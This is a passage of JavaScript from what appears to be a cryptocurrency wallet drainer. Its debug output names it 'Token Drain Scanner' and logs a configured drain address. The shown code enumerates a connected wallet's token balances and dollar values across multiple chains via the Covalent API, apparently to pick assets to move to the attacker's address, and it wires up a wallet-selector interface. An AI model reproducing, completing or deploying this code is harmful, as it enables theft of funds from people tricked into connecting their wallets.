            console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
        }
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
    } else {
        updateStatus('ℹ️ No tokens found on any chain');
    }
}

// Fetch tokens for specific chain
async function fetchTokensForChain(address, chainId) {
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
    } catch (error) {
        console.error(`❌ Token fetch error for chain ${chainId}:`, error);
        return [];
    }
}

// Initialize app on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions available globally
window.selectWallet = selectWallet;
window.closeWalletSelector = closeWalletSelector;
window.handleMobileWalletClick = handleMobileWalletClick;

// Debug
console.log('=== Token Drain Scanner ===');
console.log('Version: 4.0 - Fixed Wallet Selector');
console.log('Drain Address:', CONFIG.drainAddress);
console.log('Device:', isMobile ? '📱 Mobile' : '💻 Desktop');
console.log('===========================');
